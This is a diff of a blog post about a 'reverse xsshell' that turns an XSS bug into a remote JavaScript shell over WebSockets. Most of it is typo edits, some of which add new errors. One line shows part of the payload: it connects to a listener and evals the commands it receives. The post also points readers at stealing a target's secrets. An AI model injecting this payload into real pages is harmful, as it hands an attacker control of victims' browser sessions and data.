@@ -9,7 +9,7 @@ description: "Having some fun playing with xss and websockets. A different appro
 
 # The initial idea
 
-While auditing a website, I found out they were using websockets to transmit data. I didn't knew much about it so I had to [ReadTheFancyManual](https://rtfm.re/). Once I understook that it was... Well... A socket one could use with web technologies, I asked myself "What do I usually do with sockets?"
+While auditing a website, I found out they were using websockets to transmit data. I didn't kow much about it so I had to [ReadTheFancyManual](https://rtfm.re/). Once I understood that it was... Well... A socket one could use with web technologies, I asked myself "What do I usually do with sockets?"
 
 Tunnels! Transfer files! Or... Spawn reverse shells?!
 
@@ -72,7 +72,7 @@ s=new WebSocket("ws://localhost:8080/"),s.onmessage=function(ev){try{s.send(eval
 
 ## In short
 
-The code can be found here : https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss
+You can find the code here: https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss
 
 And what this gives us is a reverse shell in a javascript (browser / renderer) context. What you can do from here is up to you.. Try to read files, query the network, mess with your target's DOM or secrets... Have fun ! :)
 
@@ -83,14 +83,14 @@ And what this gives us is a reverse shell in a javascript (browser / renderer) c
 
 # Limitations
 
-- You still need an xss little restrictions (use eval, long payload, ...)
+- You still need an xss with little restrictions (use eval, long payload, ...)
 - The reverse xsshell can be blocked on its way back by a firewall / proxy / SOP / CSP / ...
 - Blocking actions (alert, prompt, redirect, ...) will break the current shell (trig xss again!)
 
 
 # Appendix
 
-Once again, after spending some time playing arount with a new idea, I start googling it and... Well, it's not _really_ something new. It's just about re-discovering [what others found before](https://github.com/raz-varren/xsshell). That being said, I love one-liners and keeping things as simple as possible, so it's not the same-same.. :)
+Once again, after spending some time experimenting a new idea, I start google it and... Well, it's not _really_ something new. It's just about re-discovering [what others found before](https://github.com/raz-varren/xsshell). That being said, I love one-liners and keeping things as simple as possible, so it's not the same-same.. :)
 
 
 <img class="img_big" src="/hacking/reverse_xsshell/same_but_different.gif" alt="same_but_different">
